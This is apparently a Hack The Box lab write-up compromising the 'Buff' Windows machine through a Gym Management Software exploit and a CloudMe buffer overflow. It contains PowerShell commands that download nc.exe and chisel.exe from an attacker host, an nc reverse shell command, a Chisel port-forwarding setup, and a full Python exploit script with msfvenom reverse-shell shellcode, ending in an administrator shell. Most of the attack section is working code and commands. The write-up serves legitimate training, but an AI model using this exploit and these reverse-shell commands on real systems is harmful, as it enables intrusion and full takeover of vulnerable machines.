![Pasted image 20230714105235](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/0e7f954a-3dca-4b74-b989-70ba6e4e4ca2)


# Enumeration
```
Nmap scan report for 10.129.2.18
Host is up (0.011s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-title: mrb3n's Bro Hut
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests

NSE: Script Post-scanning.
```
Windows server with only a web service running on port 8080

Checking out the website, it is running "Gym Management Software 1.0"
![Pasted image 20230714105743](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/4a76e346-049e-4bba-ad40-2bbcccd08e29)

# Foothold
Looking into the version, there is a vulnerability on exploitdb that should work. It needed a few changes to get it to work, but eventually I was able to run the program correctly:

![Pasted image 20230714111735](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/4b1cb286-fead-4847-a920-94c3f83b2af2)

Nice! That's the user!
> Note: ChatGPT is a great tool for walking through any script that you don't understand and can even be used to make changes.

# PrivEsc
I first need a better shell. I can't change directory in this one. I can only run commands from here and that's not super helpful...

```powershell
powershell Invoke-WebRequest -Uri http://10.10.14.59:1337/nc.exe -OutFile C:\xampp\htdocs\gym\upload\nc.exe
```

After uploading the nc.exe binary, I can use it to get a better shell back to me:
```
nc.exe 10.10.14.135 4443 -e powershell
```

Now I have a better shell! Time to snoop. 

Found an interesting bat file:
```
PS C:\Users\shaun\Downloads> dir
dir


    Directory: C:\Users\shaun\Downloads


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----       16/06/2020     16:26       17830824 CloudMe_1112.exe                                                              


PS C:\Users\shaun\Downloads>
```

It has a buffer overflow vulnerability according to google... 
This part ended up being a major headache for me personally. I needed to set up port forwarding to get this to work, but everything I found online was either missing key information or was WAAAAAY more complicated than necessary for this task. 
After reviewing what I had done so far, I created a stable shell on the box, then I needed to set up port forwarding so I can send traffic to the port on 8888. The reason for this is that the port is "open" but only to traffic directly from the local host. I can use a program called Chisel to send traffic over a forwarded port. 

Github repo for the Chisel:
https://github.com/jpillora/chisel/releases
On my linux machine, download the correct one, use `gunzip` to decompress the file, and run the following command:
```
./chisel server -p 9999 --reverse
```
This sends traffic from my machine over port 9999 out to another host

Now upload the windows binary for chisel and send it to the windows machine. It needs to be placed in a different folder. the downloads folder for the user Shaun works great. Use the same powershell command for nc.exe to get chisel.exe on the box:
```powershell
powershell Invoke-WebRequest -Uri http://10.10.14.59:1337/chisel.exe -OutFile C:\Users\shaun\Downloads\chisel.exe
```

Then I can run it with the following command (if my reverse shell is using powershell as above):
```powershell
\chisel.exe client 10.10.14.59:9999 R:8888:127.0.0.1:8888
```
This opens a connection back to my machine on port 9999, and tells it to send the traffic to the local host IP over port 8888 which is what CloudME is using. Now I need to modify the buffer overflow code. 

Modifying the public exploit online, I get this python script:
```python 
import socket
import sys
target = "127.0.0.1"
padding1 = b"\x90" * 1052
EIP = b"\xB5\x42\xA8\x68" # 0x68A842B5 -> PUSH ESP, RET
NOPS = b"\x90" * 30
#msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.59 LPORT=4444 EXITFUNC=thread -b "\x00\x0d\x0a" -f python
payload =  b""
payload += b"\xdb\xdb\xd9\x74\x24\xf4\x5d\xbe\xab\xcf\xd7\x1e"
payload += b"\x29\xc9\xb1\x52\x31\x75\x17\x03\x75\x17\x83\x6e"
payload += b"\xcb\x35\xeb\x8c\x3c\x3b\x14\x6c\xbd\x5c\x9c\x89"
payload += b"\x8c\x5c\xfa\xda\xbf\x6c\x88\x8e\x33\x06\xdc\x3a"
payload += b"\xc7\x6a\xc9\x4d\x60\xc0\x2f\x60\x71\x79\x13\xe3"
payload += b"\xf1\x80\x40\xc3\xc8\x4a\x95\x02\x0c\xb6\x54\x56"
payload += b"\xc5\xbc\xcb\x46\x62\x88\xd7\xed\x38\x1c\x50\x12"
payload += b"\x88\x1f\x71\x85\x82\x79\x51\x24\x46\xf2\xd8\x3e"
payload += b"\x8b\x3f\x92\xb5\x7f\xcb\x25\x1f\x4e\x34\x89\x5e"
payload += b"\x7e\xc7\xd3\xa7\xb9\x38\xa6\xd1\xb9\xc5\xb1\x26"
payload += b"\xc3\x11\x37\xbc\x63\xd1\xef\x18\x95\x36\x69\xeb"
payload += b"\x99\xf3\xfd\xb3\xbd\x02\xd1\xc8\xba\x8f\xd4\x1e"
payload += b"\x4b\xcb\xf2\xba\x17\x8f\x9b\x9b\xfd\x7e\xa3\xfb"
payload += b"\x5d\xde\x01\x70\x73\x0b\x38\xdb\x1c\xf8\x71\xe3"
payload += b"\xdc\x96\x02\x90\xee\x39\xb9\x3e\x43\xb1\x67\xb9"
payload += b"\xa4\xe8\xd0\x55\x5b\x13\x21\x7c\x98\x47\x71\x16"
payload += b"\x09\xe8\x1a\xe6\xb6\x3d\x8c\xb6\x18\xee\x6d\x66"
payload += b"\xd9\x5e\x06\x6c\xd6\x81\x36\x8f\x3c\xaa\xdd\x6a"
payload += b"\xd7\xdf\x2b\x7a\x1c\x88\x29\x82\x73\x14\xa7\x64"
payload += b"\x19\xb4\xe1\x3f\xb6\x2d\xa8\xcb\x27\xb1\x66\xb6"
payload += b"\x68\x39\x85\x47\x26\xca\xe0\x5b\xdf\x3a\xbf\x01"
payload += b"\x76\x44\x15\x2d\x14\xd7\xf2\xad\x53\xc4\xac\xfa"
payload += b"\x34\x3a\xa5\x6e\xa9\x65\x1f\x8c\x30\xf3\x58\x14"
payload += b"\xef\xc0\x67\x95\x62\x7c\x4c\x85\xba\x7d\xc8\xf1"
payload += b"\x12\x28\x86\xaf\xd4\x82\x68\x19\x8f\x79\x23\xcd"
payload += b"\x56\xb2\xf4\x8b\x56\x9f\x82\x73\xe6\x76\xd3\x8c"
payload += b"\xc7\x1e\xd3\xf5\x35\xbf\x1c\x2c\xfe\xdf\xfe\xe4"
payload += b"\x0b\x48\xa7\x6d\xb6\x15\x58\x58\xf5\x23\xdb\x68"
payload += b"\x86\xd7\xc3\x19\x83\x9c\x43\xf2\xf9\x8d\x21\xf4"
payload += b"\xae\xae\x63"

overrun = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))

buf = padding1 + EIP + NOPS + payload + overrun

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,8888))
	s.send(buf)
except Exception as e:
	print(sys.exc_value)
```
The only portion I edited was the shell code using the script shown. 

Then I run the code and... 
```
$ nc -lnvp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.129.2.18.
Ncat: Connection from 10.129.2.18:49687.
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
buff\administrator
```

That's Buff PWNED!

